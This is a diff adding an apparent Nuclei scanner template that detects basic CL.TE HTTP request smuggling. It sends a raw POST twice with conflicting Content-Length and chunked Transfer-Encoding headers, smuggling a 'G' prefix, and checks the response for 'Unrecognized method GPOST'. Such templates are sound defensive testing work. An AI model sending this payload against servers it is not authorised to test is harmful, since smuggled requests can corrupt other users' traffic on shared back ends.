@@ -1,0 +1,37 @@
+id: CL-TE-http-smuggling
+
+info:
+  name: HTTP request smuggling, basic CL.TE vulnerability
+  author: pdteam
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
+
+requests:
+  - raw:
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Transfer-Encoding: chunked
+        Content-Length: 6
+
+        0
+
+        G
+      - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Transfer-Encoding: chunked
+        Content-Length: 6
+
+        0
+
+        G
+    unsafe: true
+    matchers:
+      - type: word
+        words:
+          - "Unrecognized method GPOST"
